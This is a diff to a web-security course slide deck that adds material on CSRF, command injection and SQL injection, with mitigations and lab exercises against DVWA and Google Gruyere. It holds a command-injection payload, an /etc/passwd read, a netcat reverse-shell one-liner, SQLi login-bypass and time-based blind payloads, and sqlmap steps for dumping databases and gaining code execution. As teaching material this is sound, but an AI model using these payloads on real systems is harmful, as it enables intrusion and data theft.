@@ -198,6 +198,11 @@
 	  img {
 		  box-shadow: 0 0 40px #ccc;
 	  }
+		.c {
+		display: block;
+		margin-left: auto;
+		margin-right: auto;
+		}
     </style>
   </head>
   <body>
@@ -212,11 +217,16 @@ Magnus Klaaborg Stubman
 slides: http://dumpco.re/websec
 
 ---
+# Boot USB - Choose "Live USB Persistence"
+<img src="kalip.jpg" width="80%">
+---
 
 # Agenda
 
 1. Cross-Site Scripting (XSS)
 2. Cross-Site Request Forgery (CSRF)
+3. Command injection
+4. SQL injection (SQLi)
 ---
 class: center, middle
 # XSS
@@ -345,7 +355,7 @@ Content-Type: text/html
 ```
 ---
 class: middle, center
-# Mitigation
+# XSS mitigation
 XSS prevention
 ---
 class: middle, center
@@ -355,7 +365,7 @@ a.k.a. filtering
 class: middle, center
 # Let's try !
 ---
-# Mitigation
+# XSS mitigation
 Assume that "&lt;" and "&gt;" are blacklisted:
 
 ```html
@@ -519,9 +529,9 @@ Which type of XSS would you pick if you wanted to steal an administrator's accou
 - DOM-based
 ---
 class: middle, center
-# Mitigation
+# XSS mitigation
 ---
-# Mitigation
+# XSS mitigation
 
 We want to turn:
 
@@ -532,7 +542,7 @@ into:
 <img src="outputencoding.png" width="70%">
 
 ---
-# Mitigation
+# XSS mitigation
 We achieve this by turning:
 ```html
 <script>alert("xss");</script>
@@ -543,7 +553,7 @@ into:
 ```
 HTML entities: https://dev.w3.org/html5/html-author/charref
 ---
-# Mitigation
+# XSS mitigation
 
 C#
 ```c#
@@ -668,6 +678,7 @@ class: middle
 http://example.com/transferMoney.aspx?fromAccount=4444&amp;toAccount=7777&amp;amount=5000
 ```
 <img src="downarrow.png" width="5%" style="box-shadow:none;">
+<!--<img src="downarrow.png" width="5%" style="box-shadow:none;display: block; margin-left: auto; margin-right: auto;">-->
 ```
 http://goo.gl/ZnVP5n
 ```
@@ -680,6 +691,403 @@ Location: http://example.com/transferMoney.aspx?fromAccount=4444&toAccount=7777&
 # Exercise
 1. Start "Google Gruyere" - check readme.txt
 2. Find CSRF!
+---
+class: middle, center
+# CSRF mitigation
+---
+# CSRF mitigation
+
+1. Confirmation, or
+2. anti-CSRF tokens
+(or both)
+---
+# CSRF mitigation
+
+<img src="confirm.png" width="50%" class="c">
+---
+# CSRF mitigation
+
+```html
+<form>
+	<input type="hidden" name="antiCSRFToken" value="55hHf4ueowUIFHiEW2">
+	…
+</form>
+
+```
+
+anti-CSRF token can NOT be a cookie. Why?
+---
+# Conclusion
+
+- Functionality is vulnerable to CSRF if no confirmation or anti-CSRF tokens exist
+- Both GET and POST can be used
+- Anti-CSRF token must be something which is *not* automatically added by the browser in requests, and cannot be guessed by attackers
+- Attackers can bypass anti-CSRF token protection if an XSS exists
+---
+class: middle, center
+# Command injection
+---
+# Command injection
+
+<img src="deletefile.png" width="40%">
+
+```html
+<p>Enter filename to delete</p>
+<form method="get">
+   <input type="text" name="filename">
+   <input type="submit">
+</form>
+<?php
+   if (isset( $_GET['filename'] ) ){
+       echo "Deleting file...";
+       system("rm '" . $_GET['filename'] . "'");
+   }
+?>
+```
+---
+<img src="phpsystem.png" width="100%">
+---
+# Command injection
+<img src="deletefile2censored.png" width="100%">
+```php
+system("rm '" . $_GET['filename'] . "'");
+```
+---
+# Command injection
+<img src="deletefile2.png" width="100%">
+
+Payload:
+```
+aa'; uname -a #
+```
+```php
+system("rm '" . $_GET['filename'] . "'");
+system("rm 'aa'; uname -a #'");
+```
+---
+# Command injection
+command separator: 
+```bash
+;
+```
+and:
+```bash
+&amp;&amp;
+```
+comment out the rest of the line: 
+```bash
+#
+```
+---
+# Exercise
+1. Start "Damn Vulnerable Web App (DVWA)" - check readme.txt
+2. Exploit the command injection vulnerability
+3. Get the contents of the `/etc/passwd` file
+4. Change DVWA security level from "low" to "medium" and attempt to exploit the vulnerability again
+4. Start a local netcat listener in a terminal and use the command injection to launch a reverse shell from the webserver
+	- Netcat listener: `nc -l -v -p 4444`
+	- Reverse shell: `nc -e /bin/bash 127.0.0.1 4444`
+---
+class: middle, center
+# Command injection mitigation
+---
+# Command injection mitigation
+
+1. Whitelist user input, or
+2. Input filtering
+---
+# Command injection mitigation
+```html
+<p>Enter filename to delete</p>
+<form method="get">
+   <input type="text" name="filename">
+   <input type="submit">
+</form>
+<?php
+	$input = $_GET['filename'];
+   if (isset( $input) ){
+
+	    echo "Deleting file...";
+		if ($input === "summer.jpg") {
+		   system("rm '" . $input . "'");
+		} elseif ($input === "autumn.jpg") {
+		   system("rm '" . $input . "'");
+		} elseif ($input === "winter.jpg") {
+		   system("rm '" . $input . "'");
+		} else {
+		   echo "Error! File not whitelisted!"
+		}
+   }
+?>
+```
+---
+# Command injection mitigation
+DVWA command injection level: impossible
+```php
+$target = $_REQUEST[ 'ip' ];
+$target = stripslashes( $target );
+
+$octet = explode( ".", $target );
+
+if( ( is_numeric( $octet[0] ) ) &&
+	( is_numeric( $octet[1] ) ) &&
+	( is_numeric( $octet[2] ) ) &&
+	( is_numeric( $octet[3] ) ) &&
+	( sizeof( $octet ) == 4 ) ) {
+
+	$target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+
+	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+		$cmd = shell_exec( 'ping  ' . $target );
+	}
+	else {
+		$cmd = shell_exec( 'ping  -c 4 ' . $target );
+	}
+
+	echo "<pre>{$cmd}</pre>";
+} else {
+	echo '<pre>ERROR: You have entered an invalid IP.</pre>';
+}
+```
+---
+# Conclusion
+- Never trust unfiltered user input as part of a system command or `eval()` argument
+---
+class: middle, center
+# SQL injection (SQLi)
+---
+# SQLi
+Table:
+```
++-USERS----+----------+
+| username | password |
++---------------------+
+| admin    | pass123  |
+| kevin    | m0ney    |
+| john     | 619air   |
++----------+----------+
+```
+Query:
+```SQL
+SELECT * FROM users WHERE username='kevin' AND password='m0ney';
+```
+Result:
+```
++----------+----------+
+| kevin    | m0ney    |
++----------+----------+
+```
+---
+# SQLi
+```PHP
+$query = "SELECT * FROM users WHERE username='" . $_GET['username'] .
+         "' AND password='" . $_GET['password'] . "';";
+```
+If we set username to:
+```
+admin';--
+```
+
+Query becomes:
+```SQL
+SELECT * FROM users WHERE username='admin';--' AND password='';
+```
+Result:
+
+?
+---
+# SQLi
+```PHP
+$query = "SELECT * FROM users WHERE username='" . $_GET['username'] .
+         "' AND password='" . $_GET['password'] . "';";
+```
+If we set username to: 
+```
+admin';--
+```
+
+Query becomes:
+```SQL
+SELECT * FROM users WHERE username='admin';--' AND password='';
+```
+Result:
+```
++---------------------+
+| admin    | pass123  |
++---------------------+
+```
+---
+# SQLi
+```PHP
+$query = "SELECT * FROM users WHERE username='" . $_GET['username'] .
+         "' AND password='" . $_GET['password'] . "';";
+```
+If we set username to `admin` and password to:
+```
+' OR '1'='1
+```
+Query becomes:
+```SQL
+SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1';
+```
+Result:
+
+?
+---
+# SQLi
+```PHP
+$query = "SELECT * FROM users WHERE username='" . $_GET['username'] .
+         "' AND password='" . $_GET['password'] . "';";
+```
+If we set username to `admin` and password to:
+```
+' OR '1'='1
+```
+Query becomes:
+```SQL
+SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1';
+```
+Result:
+```
++---------------------+
+| admin    | pass123  |
+| kevin    | m0ney    |
+| john     | 619air   |
++----------+----------+
+```
+---
+# SQLi
+
+```SQL
+SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1';
+```
+<img src="downarrow.png" width="5%" style="box-shadow:none;display: block; margin-left: auto; margin-right: auto;">
+```SQL
+SELECT * FROM users WHERE (username='admin' AND password='') OR ('1'='1');
+                                             ^                     ^
+                                             |                     |
+                         is evaluated first, returns nothing       |
+                                                                   |
+                              is evaluated secondly, returns all items in table
+```
+full list of operator precedence: https://dev.mysql.com/doc/refman/5.7/en/operator-precedence.html
+---
+# Blind SQLi
+A SQLi is said to be "blind" if the attacker get no feedback regardless wether the query was successfull or caused an exception.
+---
+# Blind SQLi
+A SQLi is said to be "blind" if the attacker get no feedback regardless wether the query was successfull or caused an exception.
+
+Exploitation: make the request take more time if it was successful. (this is known as a side channel)
+---
+# Blind SQLi
+```sql
+# MySQL
+SELECT * FROM products WHERE id=1-SLEEP(15)
+SELECT * FROM products WHERE id=1-BENCHMARK(100000000, rand())
+
+# SQLServer
+SELECT * FROM products WHERE id=1; WAIT FOR DELAY '00:00:15'
+SELECT * FROM products WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'
+
+# Oracle
+BEGIN DBMS_LOCK.SLEEP(15); END;
+```
+---
+# Blind SQLi
+```sql
+SELECT
+	IF(SUBSTRING(user_password,1,1) = CHAR(65),SLEEP(2),null)
+FROM
+	users WHERE user_id = 1;
+```
+`char(65)` is "A"
+(http://www.asciitable.com/)
+---
+# Exercise
+1. start Damn Vulnerable Web App (DVWA) - check readme.txt
+2. Exploit the SQLi
+3. Use `sqlmap` to exploit the SQLi (run `sqlmap -hh` for help)
+4. Proxy `sqlmap` through burp so that you can see what's going on. Look at `sqlmap`'s traffic. (`--proxy=http://127.0.0.1:8080`)
+4. Dump entire database using `sqlmap` (without proxying through burp)
+5. Get remote code execution using `sqlmap` (without proxying through burp)
+6. Get remote code execution again using `sqlmap`, this time while proxying through burp. How does `sqlmap` get code execution?
+
+note: If `sqlmap` starts acting weird, run `sqlmap --purge-output` and make sure that your session is still valid
+
+---
+class: middle, center
+# SQLi mitigation
+---
+# SQLi mitigation
+
+```SQL
+                                      +---- data ---------+
+                                      |                   |
+                                      v                   v
+SELECT * FROM users WHERE username='kevin' AND password='m0ney';
+  ^    ^  ^     ^     ^       ^             ^     ^
+  |    |  |     |     |       |             |     |
+  +-------------------- query --------------------+
+```
+
+Solution: separate query and data
+---
+# SQLi mitigation
+
+```php
+$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
+$stmt->bind_param("ss", $username, $password);
+```
+
+```SQL
+admin';--
+```
+becomes
+```SQL
+admin'';--
+```
+' is the escape character
+---
+# SQLi mitigation
+```c#
+private static void UpdateDemographics(Int32 customerID,
+    string demoXml, string connectionString)
+{
+    string commandText = "UPDATE Sales.Store SET Demographics = @demographics "
+        + "WHERE CustomerID = @ID;";
+
+    using (SqlConnection connection = new SqlConnection(connectionString))
+    {
+        SqlCommand command = new SqlCommand(commandText, connection);
+        command.Parameters.Add("@ID", SqlDbType.Int);
+        command.Parameters["@ID"].Value = customerID;
+
+        command.Parameters.AddWithValue("@demographics", demoXml);
+
+        try
+        {
+            connection.Open();
+            Int32 rowsAffected = command.ExecuteNonQuery();
+            Console.WriteLine("RowsAffected: {0}", rowsAffected);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(ex.Message);
+        }
+    }
+}
+```
+---
+# mandatory xkcd reference
+
+<img src="exploits_of_a_mom.png" width="100%">
+
+source: https://xkcd.com/327/
+---
+# Homework
+1. Browse https://wordpress.org/plugins/ and find a wordpress plugin which seems to be new/unpopular
+2. Search for vulnerabilities in it
 ---
 class: middle, center
 # Questions?
